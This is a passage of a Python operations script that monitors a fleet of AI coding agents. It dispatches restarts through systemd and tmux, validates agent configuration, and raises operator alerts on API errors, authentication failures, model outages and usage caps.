    Returns (dispatched_ok, output, unit_name); never raises. Forensics:
    `journalctl --user -u <unit_name>`.

    skip_ack (T-2459): appends ``--skip-ack`` to handoff_and_restart.sh (force
    path — a 400ing session can't write a handoff), matching the blocking
    fire_restart's skip_ack. collect (T-2459): with --collect systemd garbage-
    collects the unit even on FAILURE, so its exit status can't be read back a
    cycle later; context-fill passes collect=False so a FAILED remediate unit
    LINGERS (systemd still auto-collects a SUCCESSFUL transient unit), giving
    reconcile_prior_dispatch a deterministic cross-cycle signal. channel-liveness
    keeps --collect (it judges effectiveness by re-probing the bridge, not the unit).
    """
    unit = f"{unit_prefix}-{agent}-{int(time.time())}"
    cmd = (
        ["systemd-run", "--user"]
        + (["--collect"] if collect else [])
        + ["--unit", unit,
           "-p", f"RuntimeMaxSec={DETACHED_RESTART_RUNTIME_MAX_SECONDS}",
           "--"]
        + build_restart_argv(cfg, agent, skip_ack)
    )
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=DETACHED_DISPATCH_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        return False, f"dispatch error: {exc!r}", unit
    output = (r.stdout + r.stderr).strip()
    return r.returncode == 0, output, unit


def fire_restart(cfg: dict, agent: str, skip_ack: bool = False) -> tuple[bool, str]:
    """Invoke handoff_and_restart.sh against the agent's tmux via sudo'd shell.

    skip_ack=True appends ``--skip-ack`` (force path): handoff_and_restart.sh
    skips the pre-restart handoff-write wait. Used by the api-health force path
    (a 400ing session can't write a handoff). Defaults False so the graceful
    context-fill-threshold (T-0763) and wedge/staleness paths stay graceful.

    Streams the script's stdout+stderr to the journal line-by-line via
    `_log(agent, ...)` so each restart-pipeline step ([handoff-and-restart]
    INFO/ERROR lines) shows up in `journalctl --user` in real time. Per
    T-0590 (b): previously the wrapper used capture_output=True and its
    log lines disappeared into the python process, forcing pane-forensic
    diagnosis of pipeline failures.

    Returns (success, combined-output). The streamed lines are also
    accumulated and returned so the existing failure log
    (`restart failed: {output[:500]}`) still surfaces the tail.
    """
    if cfg.get("observation_only"):
        # Structural refusal: observation-only agents (mnemosyne) have no
        # valid restart_bin and their auto-restart posture is deliberately
        # not-Recovery's-call. Any path reaching here is a wiring bug, not a
        # reason to restart the agent.
        msg = f"refusing fire_restart: agent '{agent}' is observation_only"
        _log(agent, msg)
        return False, msg
    cmd = build_restart_argv(cfg, agent, skip_ack)

    collected: list[str] = []
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,  # line-buffered
        )
    except OSError as exc:
        return False, f"subprocess error: {exc!r}"

    deadline = time.time() + RESTART_INVOCATION_TIMEOUT_SECONDS
    assert proc.stdout is not None
    try:
        for line in proc.stdout:
            stripped = line.rstrip("\n")
            collected.append(stripped)
            _log(agent, f"handoff_and_restart: {stripped}")
            if time.time() > deadline:
                proc.kill()
                proc.wait(timeout=5)
                return False, "subprocess error: invocation exceeded RESTART_INVOCATION_TIMEOUT_SECONDS"
    except OSError as exc:
        proc.kill()
        proc.wait(timeout=5)
        return False, f"subprocess error: {exc!r}"

    # Drain to set returncode (proc.stdout iterator already exited).
    rc = proc.wait(timeout=max(1.0, deadline - time.time()))
    output = "\n".join(collected)
    return rc == 0, output


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def _validate_config() -> int:
    """T-0824 part 3b: pre-arm validation, mirroring restart_drain._validate_config.

    Checks every AGENT_CONFIG persona key against the canonical persona set
    (agent_role_map.py, the runtime mirror of sop/standard/agent-role-map.md),
    that the structural fields are present, and that each path resolves. Path
    checks are account-aware: each account runs its own monitor and can only
    stat paths under its own home, so this account's paths hard-fail on absence
    while cross-account paths are soft-noted (that account's own --validate run
    checks them). Returns 0 if all checks pass, 1 otherwise. Runnable at bringup
    before arming, so a wrong jsonl_dir/service/pane is caught loudly up front
    rather than failing silently at runtime.
    """
    try:
        try:
            from agent_role_map import AGENT_ROLE_MAP  # run-as-script
        except ImportError:
            from tools.agent_role_map import AGENT_ROLE_MAP  # run-as-package
        valid_personas = set(AGENT_ROLE_MAP.keys())
    except Exception as exc:
        _log("validate", f"could not load canonical persona set ({exc!r})")
        return 1

    home = str(Path.home())
    problems: list[str] = []
    skipped: list[str] = []
    # T-2076 review #2: a persona declared in _MONITOR_TUNING but MISSING from a fresh
    # build means its instance.yaml binding failed to load (a malformed role, or a
    # fallback that lost the persona) — it would silently go unmonitored, the exact
    # silent-gap class this validation exists to kill. Check a fresh _build_agent_config()
    # (not the module AGENT_CONFIG, which callers/tests may patch) so this reflects the
    # build itself. Surface it loudly.
    _built_personas = set(_build_agent_config())
    for persona in _MONITOR_TUNING:
        if persona not in _built_personas:
            problems.append(
                f"agent '{persona}' is declared in _MONITOR_TUNING but has no built config "
                f"(no instance.yaml binding / account) — it will NOT be monitored; add or "
                f"fix its instance.yaml roles: entry (account + restart fields)"
            )
    for agent, cfg in AGENT_CONFIG.items():
        if agent not in valid_personas:
            problems.append(
                f"agent '{agent}' not a canonical persona {sorted(valid_personas)}"
            )
        # Observation-only entries (e.g. mnemosyne) exist for the read-only
        # consumers of AGENT_CONFIG (channel-liveness, credential-expiry) and
        # have NO fire path: no @agent timer instance, remediate=False. The
        # restart-field requirements apply only to agents something can fire.
        observation_only = bool(cfg.get("observation_only"))
        required = ("jsonl_dir", "sudo_user") if observation_only else (
            "jsonl_dir",
            "sudo_user",
            "restart_service",
            "restart_target_pane",
            "restart_bin",
        )
        for field in required:
            if not cfg.get(field):
                problems.append(f"agent '{agent}': no {field} configured")
        # T-2071 seeder footgun: the sudo_user account must actually exist on this
        # box. Left-over reference-instance defaults (claude/claude-research/…) on a
        # fork's box otherwise make the monitor silently watch nothing — the runtime
        # path probe fails INCONCLUSIVE (not 'absent'), so nothing alerts. Account
        # existence is globally visible (passwd DB), so check EVERY agent here, not
        # just this-account. Observation-only entries are forward-looking placeholders
        # (a seat can be registered BEFORE its account is provisioned — same posture
        # that relaxes their restart-field requirements above), so a missing account
        # is a SOFT note for them, not a hard fail; for fire-path agents it is a hard
        # fail — exactly the misconfig --validate exists to catch loudly at bringup.
        acct = cfg.get("sudo_user")
        if acct and not account_exists(acct):
            if observation_only:
                skipped.append(
                    f"agent '{agent}': account '{acct}' absent (observation-only entry; "
                    f"the read-only sweep skips it until its account is provisioned)"
                )
            else:
                problems.append(
                    f"agent '{agent}': sudo_user account '{acct}' does not exist on this "
                    f"box — the monitor cannot read {agent}'s jsonl and will never fire "
                    f"(likely leftover reference-instance defaults; set AGENT_CONFIG to "
                    f"your real accounts)"
                )
        # T-1497 part B small-window rule: below the calibration floor both the
        # min() trigger margin and the idle-ceiling invariant degrade, so an
        # explicit per-agent absolute calibration is REQUIRED (constants block).
        cfg_window = int(cfg.get("context_window", DEFAULT_CONTEXT_WINDOW_TOKENS))
        if cfg_window < SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS and not cfg.get(
            "restart_absolute_tokens"
        ):
            problems.append(
                f"agent '{agent}': context_window {cfg_window} is below the "
                f"{SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS} calibration floor and has no "
                f"restart_absolute_tokens override (T-1497 small-window rule)"
            )
        # Account-aware path existence (jsonl_dir / restart_bin / handoff_file).
        for field in ("jsonl_dir", "restart_bin", "handoff_file"):
            val = cfg.get(field)
            if not val:
                continue
            sval = str(val)
            if sval.startswith(home):
                if not os.path.exists(sval):
                    problems.append(f"agent '{agent}': {field} does not resolve: {sval}")
            else:
                skipped.append(
                    f"agent '{agent}': {field} cross-account (not under {home}); "
                    f"that account's own --validate checks it"
                )

    for s in skipped:
        _log("validate", f"skip: {s}")
    if problems:
        for p in problems:
            _log("validate", f"FAIL: {p}")
        return 1
    _log(
        "validate",
        f"OK: {len(AGENT_CONFIG)} agent config(s) structurally valid "
        f"({', '.join(sorted(AGENT_CONFIG))}); {len(skipped)} cross-account path(s) deferred",
    )
    return 0


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Pantheon context-fill monitor (per-agent)."
    )
    parser.add_argument(
        "--agent",
        choices=sorted(AGENT_CONFIG.keys()),
        default="orchestrator",
        help="Which agent's jsonl to monitor (default: orchestrator, for backward-compat).",
    )
    parser.add_argument(
        "--validate",
        action="store_true",
        help="Validate all agent configs (persona keys + path resolution) and exit "
             "0 if clean, 1 otherwise. Run at bringup before arming the timer.",
    )
    parser.add_argument(
        "--report",
        action="store_true",
        help="Read-only: print latest usage + fill %% for --agent and exit. "
             "Zero side effects — no alerts, no restarts, no state writes. "
             "Intercepts before the monitor/remediation loop (T-2709).",
    )
    return parser.parse_args(argv)


def _maybe_fire_api_health(agent: str, cfg: dict, jsonl: Path) -> int | None:
    """Run the API-health check (T-0510, generalized to all agents T-0867).

    Detects an alive-but-400ing session (sustained API errors in the jsonl) and
    force-restarts it. The force route depends on the agent's restart mode:
      - tombstone agents (Recovery): write a force-restart tombstone; the drain
        fires it --skip-ack within ~30s.
      - direct agents (Orchestrator/Specialist): dispatch_detached_restart(skip_ack=True) here
        (T-2459 — a detached transient unit, never a blocking in-cgroup call).
    Returns 0 if a force-restart was initiated (tombstone written OR direct fire
    succeeded), 1 if a direct fire failed, or None to fall through to the
    context-fill check.

    Gated on PANTHEON_API_HEALTH_ENABLED (default OFF, API_HEALTH_DEFAULT_ENABLED).
    Per the T-0867 ship-dark playbook the flag is armed per-agent via a systemd
    drop-in at the supervised first-fire — Orchestrator/Specialist stay inert until then.

    Uses its OWN cooldown + state file, independent of the context-fill cooldown:
    an api-health cooldown must not block context-fill and vice versa.
    """
    enabled_default = "1" if API_HEALTH_DEFAULT_ENABLED else "0"
    enabled = os.environ.get("PANTHEON_API_HEALTH_ENABLED", enabled_default) == "1"
    if not enabled:
        return None

    api_cooldown = int(
        os.environ.get("API_HEALTH_COOLDOWN_SECONDS", API_HEALTH_COOLDOWN_SECONDS)
    )
    api_state_path = _api_health_state_path_for_agent(agent)
    if in_cooldown(api_state_path, api_cooldown):
        # Bail the api-health check only; context-fill (own cooldown) still runs.
        _log(agent, "api-health: in cooldown; skipping api-health check")
        return None

    records = read_recent_records(jsonl, cfg["sudo_user"], agent)
    detected = detect_sustained_api_errors(records, time.time())
    if not _check_error_persistent(agent, "api_health", detected):
        return None

    # Sustained run of force-worthy API errors → write a force-restart tombstone.
    # Track consecutive fires: if the previous api-health fire was recent (within
    # 2x cooldown) the prior force-restart did NOT clear the poison.
    prior = _read_state_file(api_state_path)
    consecutive = 1
    if prior is not None:
        try:
            prior_ts = int(prior.get("ts", 0))
        except (TypeError, ValueError):
            prior_ts = 0
        if prior_ts and (int(time.time()) - prior_ts) < 2 * api_cooldown:
            try:
                consecutive = int(prior.get("consecutive", 0)) + 1
            except (TypeError, ValueError):
                consecutive = 2

    if consecutive >= 2:
        _log(
            agent,
            f"[CRITICAL] api-health: force-restart #{consecutive} without recovery — a fresh "
            f"session is still erroring; a restart may not clear the poison (upstream / harness?). "
            f"Operator escalation may be needed.",
        )

    # Fire the force-restart. Tombstone agents (Recovery) ride the drain --skip-ack
    # path; direct agents (Orchestrator/Specialist, T-0867) dispatch a detached transient unit
    # (T-2459). State is written ONLY on a confirmed dispatch so the api-health cooldown
    # is never armed against a restart that did not happen (which would suppress
    # the very retry the short cooldown exists to allow).
    if cfg.get("use_tombstone"):
        state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
        state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
        tombstone_path = write_tombstone(state_dir, agent, reason=API_HEALTH_FORCE_REASON)
        _log(
            agent,
            f"api-health: sustained API-error run detected (consecutive={consecutive}); "
            f"wrote force-restart tombstone {tombstone_path}; drain will --skip-ack restart within ~30s",
        )
        write_api_health_state(api_state_path, agent, jsonl, consecutive)
        return 0

    # T-2459: DISPATCH the force-restart into a detached transient unit instead of
    # blocking (a 15-min oneshot must not synchronously own the cross-UID restart —
    # it SIGKILLs and orphans it at TimeoutStartSec). Effectiveness (was the
    # restart real, or did it fail e.g. lock-held) is judged cross-cycle by
    # reconcile_prior_dispatch reading the unit's exit status — NOT reset here.
    ok, output, unit = dispatch_detached_restart(
        cfg, agent, reason=API_HEALTH_FORCE_REASON, skip_ack=True
    )
    if ok:
        _log(
            agent,
            f"api-health: sustained API-error run detected (consecutive={consecutive}); "
            f"force-restart DISPATCHED as transient unit {unit} (async; forensics: "
            f"journalctl --user -u {unit}); recording state",
        )
        write_api_health_state(api_state_path, agent, jsonl, consecutive)
        return 0
    _log(agent, f"api-health: force-restart dispatch FAILED: {output[:500]}")
    failure_count = bump_restart_failure_count(agent, output[:500])
    if failure_count >= RESTART_FAILURE_ALERT_THRESHOLD:
        maybe_alert_restart_failure_threshold(agent, failure_count, output)
    return 1


def _maybe_fire_model_outage(agent: str, cfg: dict, jsonl: Path) -> bool:
    """Detect an agent pinned to a REMOVED/inaccessible model and ALERT (T-1126).

    Distinct from _maybe_fire_api_health: a sustained run of 404 model-unavailable
    errors ("model_not_found" / no access) means the session's --model is gone. A
    force-restart re-pins the same dead model and would 404 again (restart loop) —
    so this routes to an ALERT to Recovery (who escalates: change --model), NEVER a
    restart. Reuses detect_sustained_api_errors with MODEL_OUTAGE_STATUSES, so the
    same min-run / span / recency guards apply (a transient 404 won't alert).

    Returns True iff an alert was fired (for the caller's logging); alert-only, so
    it never gates the poll loop. Gated on PANTHEON_MODEL_OUTAGE_ENABLED (default
    OFF) — committing this is inert until a SUPERVISED first-fire arms it per-agent
    via a systemd drop-in. Own cooldown state file (independent control loop).
    """
    enabled_default = "1" if MODEL_OUTAGE_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_MODEL_OUTAGE_ENABLED", enabled_default) != "1":
        return False

    cooldown = int(
        os.environ.get("MODEL_OUTAGE_COOLDOWN_SECONDS", MODEL_OUTAGE_COOLDOWN_SECONDS)
    )
    state_path = _model_outage_state_path_for_agent(agent)
    if in_cooldown(state_path, cooldown):
        _log(agent, "model-outage: in cooldown; skipping")
        return False

    records = read_recent_records(jsonl, cfg["sudo_user"], agent)
    detected = detect_sustained_api_errors(
        records, time.time(), force_statuses=MODEL_OUTAGE_STATUSES
    )
    if not _check_error_persistent(agent, "model_outage", detected):
        return False

    msg = (
        f"🚨 [model-outage] {agent} has a SUSTAINED run of 404 model-unavailable API "
        f"errors (model_not_found / no access). The agent is almost certainly pinned to a "
        f"REMOVED or inaccessible --model. A force-restart will NOT fix this (it re-pins the "
        f"dead model → loop); the T-0510 api-health watchdog deliberately ignores 404 for "
        f"that reason. FIX: change the agent's --model to a live model, then restart. "
        f"(T-1126 / incident T-1125 — the ~18h Fable-5 outage.)"
    )
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, MODEL_OUTAGE_ALERT_LABEL)
        delivered = True
    except Exception as exc:  # alert routing must never wedge the monitor
        _log(agent, f"model-outage: alert routing failed {exc!r}")
    # Stamp the cooldown on detection regardless of delivery hiccups, so a flaky
    # alert send doesn't turn into a per-poll spam loop.
    write_model_outage_state(state_path, agent, jsonl)
    _log(agent, f"model-outage: sustained 404 run detected; alert {'sent' if delivered else 'attempted'}")
    return True


def _maybe_fire_auth_outage(agent: str, cfg: dict, jsonl: Path) -> bool:
    """Detect a session that cannot AUTHENTICATE (sustained 401s) and ALERT (T-1223).

    Distinct from _maybe_fire_api_health (400 → force-restart) and
    _maybe_fire_model_outage (404 → alert): a sustained run of 401
    "Invalid authentication credentials" means the OAuth credential is dead
    (expired access token + missing/empty/revoked refresh token). A force-restart
    re-inherits the same dead credential and 401s again, so this routes to an ALERT
    — DIRECT to the operator, because re-login (browser OAuth) is his and no agent can
    self-remediate it (mirrors the credential-monitor / recovery-self carve-out). Closes
    the gap that hid the 2026-06-20→22 outage for ~3 days (401 was in no detection
    set). Reuses detect_sustained_api_errors with AUTH_OUTAGE_STATUSES, so the same
    min-run / span / recency guards apply — a recovered session (whose trailing
    record is a success) resets the run, so a stale 401 never false-fires. Own
    cooldown. Returns True iff an alert fired (alert-only; never gates the loop).
    """
    enabled_default = "1" if AUTH_OUTAGE_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_AUTH_OUTAGE_ENABLED", enabled_default) != "1":
        return False

    cooldown = int(
        os.environ.get("AUTH_OUTAGE_COOLDOWN_SECONDS", AUTH_OUTAGE_COOLDOWN_SECONDS)
    )
    state_path = _auth_outage_state_path_for_agent(agent)
    if in_cooldown(state_path, cooldown):
        _log(agent, "auth-outage: in cooldown; skipping")
        return False

    records = read_recent_records(jsonl, cfg["sudo_user"], agent)
    detected = detect_sustained_api_errors(
        records, time.time(), force_statuses=AUTH_OUTAGE_STATUSES,
        recency_seconds=AUTH_OUTAGE_RECENCY_SECONDS,
    )
    if not _check_error_persistent(agent, "auth_outage", detected):
        return False

    msg = (
        f"🔒 [auth-outage] {agent} has a SUSTAINED run of 401 Invalid-authentication-"
        f"credentials API errors — its OAuth credential cannot authenticate (expired access "
        f"token + a missing/empty/revoked refresh token). A restart will NOT fix this "
        f"(re-inherits the dead credential → loop). FIX: re-login the agent — "
        f"sop/remediation/agent-oauth-relogin.md (drive /login → code-paste). No agent can "
        f"self-remediate an OAuth credential. (T-1223 / the 2026-06-20→22 fleet 401 outage.)"
    )
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_telegram_alert  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_telegram_alert  # run-as-script (prod)
        _send_telegram_alert(msg)
        delivered = True
    except Exception as exc:  # alert routing must never wedge the monitor
        _log(agent, f"auth-outage: alert routing failed {exc!r}")
    # Stamp the cooldown on detection regardless of delivery hiccups, so a flaky
    # alert send doesn't turn into a per-poll spam loop.
    write_auth_outage_state(state_path, agent, jsonl)
    _log(agent, f"auth-outage: sustained 401 run detected; alert {'sent' if delivered else 'attempted'}")
    return True


def _capability_cap_state_path_for_agent(agent: str) -> Path:
    """Per-agent capability-cap last-alert state file (its own cooldown loop)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_capability_cap.json"


def _maybe_fire_capability_cap(agent: str, cfg: dict, jsonl: Path) -> bool:
    """Detect a session WEDGED on a capability cap (JSONL 429 + cap content) and ALERT Recovery.

    The reliable complement to _maybe_fire_spend_limit's pane-scrape (T-1980): the
    cap now surfaces as a durable per-turn isApiErrorMessage:429 in the JSONL (the
    2026-07-23 orchestrator Fable-5 wedge), where the pane text scrolls out of view between
    ticks. Reuses read_recent_records + detect_capability_cap (content-anchored, so a
    transient 429 rate-limit won't fire; a recovered session's trailing success
    breaks the run). Routes to RECOVERY — with the T-1980 stepper Recovery remediates by
    waiting for the usage window to roll (T-2290: it self-resolves; do NOT switch
    the model pin and do NOT escalate a raise — the operator has ruled no raise needed). Own cooldown; alert-only (never gates the loop); ships ON.
    Returns True iff an alert fired.
    """
    enabled_default = "1" if CAPABILITY_CAP_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_CAPABILITY_CAP_ENABLED", enabled_default) != "1":
        return False

    cooldown = int(
        os.environ.get("CAPABILITY_CAP_COOLDOWN_SECONDS", CAPABILITY_CAP_COOLDOWN_SECONDS)
    )
    state_path = _capability_cap_state_path_for_agent(agent)
    if in_cooldown(state_path, cooldown):
        _log(agent, "capability-cap: in cooldown; skipping")
        return False

    records = read_recent_records(jsonl, cfg["sudo_user"], agent)
    cap_text = detect_capability_cap(records, time.time())
    if not cap_text:
        return False

    excerpt = " ".join(cap_text.split())[:140]
    msg = (
        f"💸 [capability-cap] {agent} is capped — a SUSTAINED run of per-turn API "
        f"errors (isApiErrorMessage 429) in its JSONL: \"{excerpt}\". The session "
        f"looks idle (pane at a clean prompt) but every input silently returns this. "
        f"IT SELF-RESOLVES WHEN THE USAGE WINDOW ROLLS — despite the text saying "
        f"'monthly spend limit', the binding constraint is the CURRENT TIME WINDOW "
        f"(the operator, 2026-07-29). Measured 2026-07-29: orchestrator/metis/atlas each lost "
        f"~2h and all three resumed unaided, no intervention. DEFAULT ACTION: WAIT "
        f"and log it. Do NOT restart (re-hits the same window), do NOT switch the "
        f"--model pin, and do NOT escalate a raise-the-limit — the operator has ruled "
        f"twice that no raise is needed (T-2290). ESCALATE ONLY IF THE PATTERN "
        f"BREAKS: no successful turn well past the window, or a seat that never "
        f"comes back — that is a different fault and needs its own evidence. "
        f"NOTE the cap also kills DISPATCHED SUBAGENTS mid-run while the main loop "
        f"keeps working, so a seat can look healthy while its work dies. "
        f"(T-1980 / T-2290.)"
    )
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, CAPABILITY_CAP_ALERT_LABEL)
        delivered = True
    except Exception as exc:  # alert routing must never wedge the monitor
        _log(agent, f"capability-cap: alert routing failed {exc!r}")
    try:
        state_path.parent.mkdir(parents=True, exist_ok=True)
        state_path.write_text(json.dumps({
            "ts": int(time.time()), "agent": agent, "reason": CAPABILITY_CAP_ALERT_LABEL,
        }))
    except OSError as exc:
        _log(agent, f"capability-cap: could not persist state {exc!r}")
    _log(agent, f"capability-cap: sustained cap run detected; alert {'sent' if delivered else 'attempted'}")
    return True


def _consent_fallback_state_path_for_agent(agent: str) -> Path:
    """Per-agent consent-fallback last-alert state file (its own cooldown loop)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_consent_fallback.json"


def _maybe_fire_consent_fallback(agent: str, cfg: dict, jsonl: Path) -> bool:
    """Detect a model_consent_fallback (harness auto-switched off a capped model) and NUDGE Recovery.

    The T-1980 SIGNAL-VOID fix: the Fable-5 weekly-credits cap surfaces as a system
    record (subtype=model_consent_fallback) the harness auto-recovers from by switching
    the live session to opus — detect_capability_cap is blind to it. This is NOT a wedge
    (the session is running, on the fallback); the alert is an ACTION-NUDGE to verify the
    supervisor --model pin, because the pin still points at the capped model and the next
    restart re-stalls. Distinct message + own cooldown from _maybe_fire_capability_cap's
    WEDGED alarm. Routes to Recovery (the pin edit is Recovery's remediation). Alert-only; ships ON.
    Returns True iff an alert fired.
    """
    enabled_default = "1" if CONSENT_FALLBACK_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_CONSENT_FALLBACK_ENABLED", enabled_default) != "1":
        return False

    cooldown = int(
        os.environ.get("CONSENT_FALLBACK_COOLDOWN_SECONDS", CONSENT_FALLBACK_COOLDOWN_SECONDS)
    )
    state_path = _consent_fallback_state_path_for_agent(agent)
    if in_cooldown(state_path, cooldown):
        _log(agent, "consent-fallback: in cooldown; skipping")
        return False

    records = read_recent_records(jsonl, cfg["sudo_user"], agent)
    hit = detect_consent_fallback(records)
    if not hit:
        return False
    original, fallback = hit

    msg = (
        f"🔁 [consent-fallback] {agent} hit the Fable credits-cap and the harness "
        f"AUTO-FELL-BACK {original} → {fallback or 'opus'} for the LIVE session — it is "
        f"NOT wedged (it is running on the fallback). The residual risk is DURABILITY: the "
        f"supervisor --model pin still points at {original}, so the NEXT restart respawns "
        f"capped and re-stalls (~25-48min consent stall). FIX: verify/rewrite the agent's "
        f"supervisor --model pin {original} → claude-opus-4-8 (backup-first) so a restart "
        f"lands opus. (T-1980 consent-fallback detector / 2026-07-24 Fable-5 credits cap.)"
    )
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, CONSENT_FALLBACK_ALERT_LABEL)
        delivered = True
    except Exception as exc:  # alert routing must never wedge the monitor
        _log(agent, f"consent-fallback: alert routing failed {exc!r}")
    try:
        state_path.parent.mkdir(parents=True, exist_ok=True)
        state_path.write_text(json.dumps({
            "ts": int(time.time()), "agent": agent, "reason": CONSENT_FALLBACK_ALERT_LABEL,
        }))
    except OSError as exc:
        _log(agent, f"consent-fallback: could not persist state {exc!r}")
    _log(agent, f"consent-fallback: {original}->{fallback} detected; nudge {'sent' if delivered else 'attempted'}")
    return True


def _sweep_cap_detectors_for(agent: str, cfg: dict) -> None:
    """Run the ALERT-ONLY cap detectors for an observation_only agent on recovery's cycle.

    T-1980 coverage-void fix: mnemosyne + the ORG-043 seats have NO @agent monitor
    timer, so no cycle ever runs the cap detectors for them — a cap on those accounts
    was structurally undetectable (mnemosyne's ~4h wedge, caught by a human, not a
    monitor). Detection is SEPARABLE from remediation: this runs ONLY the detect+alert
    paths (never fire_restart), so it is safe for an agent that gets no
    remediation action on this cycle. Locates the agent's latest jsonl;
    the JSONL detectors bail quietly if it is absent (fresh/dark agent).
    _maybe_fire_spend_limit is pane-based and no-ops without a restart_target_pane (the
    seats). Fail-soft: a sweep hiccup must never wedge recovery's own cycle."""
    try:
        projects_dir = _projects_dir_for_agent(agent, cfg)
        jsonl = find_latest_jsonl(projects_dir, cfg["sudo_user"], agent)
        if jsonl is not None:
            _maybe_fire_capability_cap(agent, cfg, jsonl)
            _maybe_fire_consent_fallback(agent, cfg, jsonl)
        _maybe_fire_spend_limit(agent, cfg)
    except Exception as exc:  # a sweep hiccup must never wedge recovery's own cycle
        _log(agent, f"cap-detector sweep for {agent} failed {exc!r}; skipping")


def _spend_limit_state_path_for_agent(agent: str) -> Path:
    """Per-agent spend-limit last-alert state file (its own cooldown loop)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_spend_limit.json"


def _capture_pane_text(agent: str, cfg: dict) -> str | None:
    """Best-effort READ-ONLY capture of the agent's tmux pane (cross-account via
    sudo; self direct). Returns the pane text, or None on any failure — a capture
    hiccup must never wedge the monitor or false-fire the detector."""
    pane = cfg.get("restart_target_pane")
    if not pane:
        return None
    inner = f"XDG_RUNTIME_DIR=/run/user/$(id -u) tmux capture-pane -t {shlex.quote(pane)} -p"
    sudo_user = cfg["sudo_user"]
    cmd = (["bash", "-c", inner] if sudo_user == _current_user()
           else ["sudo", "-n", "-u", sudo_user, "bash", "-c", inner])
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    except (subprocess.SubprocessError, OSError):
        return None
    return res.stdout if res.returncode == 0 else None


def _maybe_fire_spend_limit(agent: str, cfg: dict) -> bool:
    """Detect a session WEDGED on the monthly-spend-limit modal and ALERT the operator.

    Hitting the monthly spend limit pops a BLOCKING /rate-limit-options TUI modal
    that an unattended agent cannot self-dismiss — it just sits idle. Because it is
    NOT an API error in the JSONL (unlike auth-outage's 401s), every JSONL detector
    is blind to it; only a pane scrape sees it. Raising the limit is the operator's
    account action (claude.ai/settings/usage), so — like auth-outage — this routes a
    DIRECT-to-operator alert (no agent can self-remediate). Own cooldown; ships ON;
    alert-only (never gates the loop). Returns True iff an alert fired.
    """
    enabled_default = "1" if SPEND_LIMIT_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_SPEND_LIMIT_ENABLED", enabled_default) != "1":
        return False

    cooldown = int(os.environ.get("SPEND_LIMIT_COOLDOWN_SECONDS", SPEND_LIMIT_COOLDOWN_SECONDS))
    state_path = _spend_limit_state_path_for_agent(agent)
    if in_cooldown(state_path, cooldown):
        _log(agent, "spend-limit: in cooldown; skipping")
        return False

    pane = _capture_pane_text(agent, cfg)
    if not pane or SPEND_LIMIT_SENTINEL not in pane.lower():
        return False

    msg = (
        f"💸 [spend-limit] {agent} is WEDGED on the monthly-spend-limit modal "
        f"(\"You've hit your monthly spend limit\") — a blocking /rate-limit-options "
        f"dialog it cannot self-dismiss, so it sits idle. A restart will NOT fix it "
        f"(re-hits the same limit). FIX: raise the limit at claude.ai/settings/usage "
        f"(your account action — no agent can self-remediate), then the agent needs a "
        f"modal-dismiss + poke to resume. (2026-06-26 fleet spend-limit wedge.)"
    )
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_telegram_alert  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_telegram_alert  # run-as-script (prod)
        _send_telegram_alert(msg)
        delivered = True
    except Exception as exc:  # alert routing must never wedge the monitor
        _log(agent, f"spend-limit: alert routing failed {exc!r}")
    # Stamp cooldown on detection regardless of delivery, so a flaky send doesn't spam.
    try:
        state_path.parent.mkdir(parents=True, exist_ok=True)
        state_path.write_text(json.dumps({
            "ts": int(time.time()), "agent": agent, "reason": SPEND_LIMIT_ALERT_LABEL,
        }))
    except OSError as exc:
        _log(agent, f"spend-limit: could not persist state {exc!r}")
    _log(agent, f"spend-limit: modal detected; alert {'sent' if delivered else 'attempted'}")
    return True


# --- Hook-allowlist security check (T-0536) -------------------------------


def read_telegram_token() -> str | None:
    """Read Recovery's bridge bot token from the telegram .env. Mirrors usage_monitor."""
    if not TELEGRAM_ENV.exists():
        return None
    try:
        for line in TELEGRAM_ENV.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line.startswith("TELEGRAM_BOT_TOKEN="):
                return line.split("=", 1)[1].strip()
    except OSError:
        return None
    return None


def _live_telegram_suppressed() -> bool:
    """True when live Telegram delivery should be suppressed (test context).

    Mirrors inbox_consumer._live_telegram_suppressed (T-0891): the prod entry
    points run as `python3 tools/<x>.py` and import neither unittest nor pytest,
    so their presence in sys.modules is a low-false-positive test signal.
